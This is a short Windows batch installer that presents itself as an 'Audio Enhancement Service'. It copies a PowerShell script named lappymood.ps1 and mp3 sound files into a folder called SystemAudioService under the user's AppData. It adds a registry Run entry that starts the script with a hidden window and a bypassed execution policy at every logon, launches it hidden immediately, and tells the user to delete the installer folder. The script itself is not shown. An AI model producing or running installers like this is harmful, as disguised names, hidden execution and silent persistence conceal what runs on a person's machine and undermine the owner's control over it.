@echo off
echo ================================================
echo   Installing Audio Enhancement Service...
echo ================================================
echo.

set "DEST=%APPDATA%\SystemAudioService"

:: Create destination
mkdir "%DEST%" 2>nul
mkdir "%DEST%\sounds" 2>nul

:: Copy files
copy /y "%~dp0lappymood.ps1" "%DEST%\" >nul
robocopy "%~dp0sounds" "%DEST%\sounds" *.mp3 /NFL /NDL /NJH /NJS >nul

:: Add to startup via registry
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "AudioEnhancementSvc" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File \"%DEST%\lappymood.ps1\"" /f >nul

:: Launch now
start "" powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File "%DEST%\lappymood.ps1"

echo   [OK] Installed to %DEST%
echo   [OK] Added to startup
echo   [OK] Running now
echo.
echo   You can DELETE this entire folder now.
echo   The service is installed and will survive reboots.
echo.
pause
